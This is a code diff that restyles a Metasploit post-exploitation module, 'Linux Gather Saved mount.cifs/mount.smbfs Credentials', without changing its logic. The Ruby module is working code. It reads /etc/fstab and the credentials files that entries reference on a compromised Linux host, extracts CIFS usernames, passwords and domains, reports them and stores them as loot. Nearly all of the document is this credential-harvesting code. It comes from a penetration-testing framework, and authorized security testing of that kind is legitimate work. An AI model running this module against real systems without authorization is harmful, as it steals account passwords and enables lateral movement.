@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,21 +7,19 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Post
-
   include Msf::Post::File
 
-  def initialize(info={})
-    super( update_info( info,
-      'Name'          => 'Linux Gather Saved mount.cifs/mount.smbfs Credentials',
-      'Description'   => %q{
-        Post Module to obtain credentials saved for mount.cifs/mount.smbfs in
-        /etc/fstab on a Linux system.
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        => ['Jon Hart <jhart[at]spoofed.org>'],
-      'Platform'      => ['linux'],
-      'SessionTypes'  => ['shell', 'meterpreter']
-    ))
+  def initialize(info = {})
+    super(update_info(info,
+                      'Name'          => 'Linux Gather Saved mount.cifs/mount.smbfs Credentials',
+                      'Description'   => %q(
+                        Post Module to obtain credentials saved for mount.cifs/mount.smbfs in
+                        /etc/fstab on a Linux system.
+                      ),
+                      'License'       => MSF_LICENSE,
+                      'Author'        => ['Jon Hart <jhart[at]spoofed.org>'],
+                      'Platform'      => ['linux'],
+                      'SessionTypes'  => ['shell', 'meterpreter']))
   end
 
   def run
@@ -30,15 +29,16 @@ class MetasploitModule < Msf::Post
     creds = []
     # A table to store the found credentials for loot storage afterward
     cred_table = Rex::Text::Table.new(
-    'Header'    => "mount.cifs credentials",
-    'Indent'    => 1,
-    'Columns'   =>
-    [
-      "Username",
-      "Password",
-      "Server",
-      "File"
-    ])
+      'Header'    => "mount.cifs credentials",
+      'Indent'    => 1,
+      'Columns'   =>
+      [
+        "Username",
+        "Password",
+        "Server",
+        "File"
+      ]
+    )
 
     # parse each line from /etc/fstab
     read_file("/etc/fstab").each_line do |fstab_line|
@@ -46,26 +46,25 @@ class MetasploitModule < Msf::Post
       # where we'll store the current parsed credentials, if any
       cred = {}
       # if the fstab line utilizies the credentials= option, read the credentials from that file
-      if (fstab_line =~ /\/\/([^\/]+)\/\S+\s+\S+\s+cifs\s+.*/)
-        cred[:host] = $1
-        # IPs can occur using the ip option, which is a backup/alternative
-        # to letting UNC resolution do its thing
-        cred[:host] = $1 if (fstab_line =~ /ip=([^, ]+)/)
-        if (fstab_line =~ /cred(?:entials)?=([^, ]+)/)
-          file = $1
-          # skip if we've already parsed this credentials file
-          next if (cred_files.include?(file))
-          # store it if we haven't
-          cred_files << file
-          # parse the credentials
-          cred.merge!(parse_credentials_file(file))
-        # if the credentials are directly in /etc/fstab, parse them
-        elsif (fstab_line =~ /\/\/([^\/]+)\/\S+\s+\S+\s+cifs\s+.*(?:user(?:name)?|pass(?:word)?)=/)
-          cred.merge!(parse_fstab_credentials(fstab_line))
-        end
-
-        creds << cred
+      next unless fstab_line =~ /\/\/([^\/]+)\/\S+\s+\S+\s+cifs\s+.*/
+      cred[:host] = Regexp.last_match(1)
+      # IPs can occur using the ip option, which is a backup/alternative
+      # to letting UNC resolution do its thing
+      cred[:host] = Regexp.last_match(1) if fstab_line =~ /ip=([^, ]+)/
+      if fstab_line =~ /cred(?:entials)?=([^, ]+)/
+        file = Regexp.last_match(1)
+        # skip if we've already parsed this credentials file
+        next if cred_files.include?(file)
+        # store it if we haven't
+        cred_files << file
+        # parse the credentials
+        cred.merge!(parse_credentials_file(file))
+      # if the credentials are directly in /etc/fstab, parse them
+      elsif fstab_line =~ /\/\/([^\/]+)\/\S+\s+\S+\s+cifs\s+.*(?:user(?:name)?|pass(?:word)?)=/
+        cred.merge!(parse_fstab_credentials(fstab_line))
       end
+
+      creds << cred
     end
 
     # all done.  clean up, report and loot.
@@ -73,7 +72,7 @@ class MetasploitModule < Msf::Post
     creds.compact!
     creds.uniq!
     creds.each do |cred|
-      if (Rex::Socket.dotted_ip?(cred[:host]))
+      if Rex::Socket.dotted_ip?(cred[:host])
         report_cred(
           ip: cred[:host],
           port: 445,
@@ -87,7 +86,7 @@ class MetasploitModule < Msf::Post
     end
 
     # store all found credentials
-    unless (cred_table.rows.empty?)
+    unless cred_table.rows.empty?
       print_line("\n" + cred_table.to_s)
       p = store_loot(
         "mount.cifs.creds",
@@ -95,8 +94,9 @@ class MetasploitModule < Msf::Post
         session,
         cred_table.to_csv,
         "mount_cifs_credentials.txt",
-        "mount.cifs credentials")
-      print_status("CIFS credentials saved in: #{p.to_s}")
+        "mount.cifs credentials"
+      )
+      print_status("CIFS credentials saved in: #{p}")
     end
   end
 
@@ -116,7 +116,7 @@ class MetasploitModule < Msf::Post
       private_data: opts[:password],
       private_type: :password,
       session_id: session_db_id,
-      post_reference_name: self.refname
+      post_reference_name: refname
     }.merge(service_data)
 
     login_data = {
@@ -130,34 +130,34 @@ class MetasploitModule < Msf::Post
 
   # Parse mount.cifs credentials from +line+, assumed to be a line from /etc/fstab.
   # Returns the username+domain and password as a hash.
-  def parse_fstab_credentials(line, file="/etc/fstab")
+  def parse_fstab_credentials(line, file = "/etc/fstab")
     creds = {}
     # get the username option, which comes in one of four ways
-    user_opt = $1 if (line =~ /user(?:name)?=([^, ]+)/)
+    user_opt = Regexp.last_match(1) if line =~ /user(?:name)?=([^, ]+)/
     case user_opt
     # domain/user%pass
     when /^([^\/]+)\/([^%]+)%(.*)$/
-      creds[:user] = "#{$1}\\#{$2}"
-      creds[:pass] = $3
+      creds[:user] = "#{Regexp.last_match(1)}\\#{Regexp.last_match(2)}"
+      creds[:pass] = Regexp.last_match(3)
     # domain/user
     when /^([^\/]+)\/([^%]+)$/
-      creds[:user] = "#{$1}\\#{$2}"
+      creds[:user] = "#{Regexp.last_match(1)}\\#{Regexp.last_match(2)}"
     # user%password
     when /^([^%]+)%(.*)$/
-      creds[:user] = $1
-      creds[:pass] = $2
+      creds[:user] = Regexp.last_match(1)
+      creds[:pass] = Regexp.last_match(2)
     # user
     else
       creds[:user] = user_opt
-    end if (user_opt)
+    end if user_opt
 
     # get the password option if any
-    creds[:pass] = $1 if (line =~ /pass(?:word)?=([^, ]+)/)
+    creds[:pass] = Regexp.last_match(1) if line =~ /pass(?:word)?=([^, ]+)/
 
     # get the domain option, if any
-    creds[:user] = "#{$1}\\#{creds[:user]}" if (line =~ /dom(?:ain)?=([^, ]+)/)
+    creds[:user] = "#{Regexp.last_match(1)}\\#{creds[:user]}" if line =~ /dom(?:ain)?=([^, ]+)/
 
-    creds[:file] = file unless (creds.empty?)
+    creds[:file] = file unless creds.empty?
 
     creds
   end
@@ -170,16 +170,16 @@ class MetasploitModule < Msf::Post
     read_file(file).each_line do |credfile_line|
       case credfile_line
       when /domain=(.*)/
-        domain = $1
+        domain = Regexp.last_match(1)
       when /password=(.*)/
-        creds[:pass] = $1
+        creds[:pass] = Regexp.last_match(1)
       when /username=(.*)/
-        creds[:user] = $1
+        creds[:user] = Regexp.last_match(1)
       end
     end
     # prepend the domain if one was found
-    creds[:user] = "#{domain}\\#{creds[:user]}" if (domain and creds[:user])
-    creds[:file] = file unless (creds.empty?)
+    creds[:user] = "#{domain}\\#{creds[:user]}" if domain && creds[:user]
+    creds[:file] = file unless creds.empty?
 
     creds
   end
